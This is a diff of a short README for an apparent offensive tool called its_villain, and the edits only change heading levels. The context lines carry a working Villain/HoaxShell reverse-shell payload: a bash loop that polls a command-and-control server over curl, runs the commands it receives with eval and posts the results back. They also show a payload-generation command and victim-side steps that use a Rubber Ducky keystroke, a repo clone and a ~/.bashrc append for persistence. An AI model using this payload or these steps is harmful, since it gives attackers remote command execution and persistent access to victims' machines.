@@ -1,5 +1,5 @@
-### its_villain
-## villain payload example 
+# its_villain
+#### villain payload example 
 ```
 nohup bash -c 's=192.168.178.44:8080&&i=ec36c7-343e27-7061a4&&hname=$(hostname)&&p=http://;curl -s "$p$s/ec36c7/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/343e27" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/7061a4 -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' & disown
 ```
@@ -17,14 +17,14 @@ generate payload=linux/hoaxshell/sh_curl lhost=eth0
 ```
 
 ## victim
-# rubberducky
+### rubberducky
 ALT CTRL T
 
 git clone https://github.com/dad1x/its_villain/
 cd its_villain
 chmod +x ja.sh
 
-# add lines to bashrc
+### add lines to bashrc
 ```
 echo "<COMMAND>" >> ~/.bashrc
 ```
